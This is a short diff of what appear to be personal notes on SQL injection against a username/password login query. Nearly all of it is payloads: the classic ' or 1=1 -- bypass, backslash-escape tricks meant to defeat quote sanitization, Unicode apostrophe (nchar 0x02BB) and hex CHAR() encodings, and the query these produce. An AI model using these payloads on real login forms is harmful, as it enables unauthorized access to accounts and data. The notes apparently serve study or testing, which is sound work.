@@ -1,2 +1,25 @@
 username=victim
-password='or'1=1
+password=\' or 1=1 --
+
+query something like
+
+select * from users where username = 'username' and password = 'password'
+
+so adding ' makes it
+... and password = '' or '1=1'
+
+when sanitized it makes
+
+and password = ''' or ''1=1'
+
+and password = '\'' or 
+
+nchar(0x02BB) or nchar(0x02BB)1=1
+
+CHAR(0x276f72202731)
+
+\'or 1;#
+
+creates:
+
+and password='\'' or 1 #'
